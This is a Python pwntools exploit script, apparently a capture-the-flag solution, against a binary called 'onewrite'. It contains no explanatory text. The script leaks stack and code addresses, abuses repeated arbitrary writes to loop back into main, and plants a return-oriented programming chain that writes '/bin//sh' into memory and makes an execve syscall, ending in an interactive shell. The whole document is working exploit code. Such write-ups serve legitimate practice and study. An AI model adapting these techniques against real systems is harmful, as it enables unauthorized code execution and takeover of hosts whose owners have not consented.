#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#import os
code = ELF('./onewrite', checksec=False)
context.arch = code.arch
context.log_level = 'debug'
from struct import pack
def exploit(r):
    global stack

    r.sendafter('> ', '1'.ljust(15))
    stack = int(r.recvline(), 16)
    info('%016x stack', stack)
    r.sendafter(': ', str(stack-8).ljust(15))
    r.sendafter(': ', '\x15')

    r.sendafter('> ', '2'.ljust(15))
    code.address = int(r.recvline(), 16) - 0x8a15
    base = code.address

    # Padding goes here
    p = ''
    p += pack('<Q', base+0x000000000000d9f2) # pop rsi ; ret
    p += pack('<Q', base+0x00000000002b1120) # @ .data
    p += pack('<Q', base+0x00000000000460ac) # pop rax ; ret
    p += '/bin//sh'
    p += pack('<Q', base+0x0000000000077901) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', base+0x000000000000d9f2) # pop rsi ; ret
    p += pack('<Q', base+0x00000000002b1128) # @ .data + 8
    p += pack('<Q', base+0x0000000000041360) # xor rax, rax ; ret
    p += pack('<Q', base+0x0000000000077901) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', base+0x00000000000084fa) # pop rdi ; ret
    p += pack('<Q', base+0x00000000002b1120) # @ .data
    p += pack('<Q', base+0x000000000000d9f2) # pop rsi ; ret
    p += pack('<Q', base+0x00000000002b1128) # @ .data + 8
    p += pack('<Q', base+0x00000000000484c5) # pop rdx ; ret
    p += pack('<Q', base+0x00000000002b1128) # @ .data + 8
    p += pack('<Q', base+0x0000000000041360) # xor rax, rax ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006d940) # add rax, 1 ; ret
    p += pack('<Q', base+0x000000000006e605) # syscall ; ret

    r.sendafter(': ', str(stack-0x1000).ljust(15))
    r.sendafter(': ', p64(0x45678))

    r.sendafter('> ', '1'.ljust(15))
    stack = int(r.recvline(), 16)
    r.sendafter(': ', str(stack-8))
    r.sendafter(': ', p64(code.sym['main']))

    pre = stack-0x28
    pp = ''
    r.recvuntil(' > ')
    for i in range(len(p)/8):
        #r.sendlineafter('> ', '1')
        pp += '1'.ljust(15)
        stack = pre
        pre -= 0x30
        #r.sendafter(': ', str(stack-8))
        pp += str(stack-8).ljust(15)
        #r.sendafter(': ', '\x15')
        pp += p64(code.sym['do_leak'])

        #r.sendlineafter('> ', '2')
        pp += '1'.ljust(15)
        #r.sendafter(': ', str(stack+0x180+0x28*(i+1)+i*0x10))
        #r.sendafter(': ', p[i*8:i*8+8])
        pp += str(stack+0x180+0x28*(i+1)+i*0x10).ljust(15) + p[i*8:i*8+8]
        #r.sendlineafter('> ', '1')
        pp += '1'.ljust(15)
        stack = pre+0x28
        #r.sendafter(': ', str(stack-8))
        #r.sendafter(': ', p64(code.sym['main']))
        pp += str(stack-8).ljust(15) + p64(code.sym['main'])

    r.send(pp)

    r.clean(5)

    r.sendline('1')
    stack = int(r.recvline(), 16)
    r.sendafter(': ', str(stack+0x28))
    r.sendafter(': ', p64(base+0x0000000000055f22))

    for i in range(6):
        r.sendafter('> ', '1'.ljust(15))
        stack = int(r.recvline(), 16)
        r.sendafter(': ', str(stack+0x18))
        r.sendafter(': ', p64(base+0x0000000000055f22))
    r.sendafter('> ', '1'.ljust(15))
    stack = int(r.recvline(), 16)
    r.sendafter(': ', str(stack+0x18))
    r.sendafter(': ', p64(base+0x00000000000563d9))

    r.interactive()

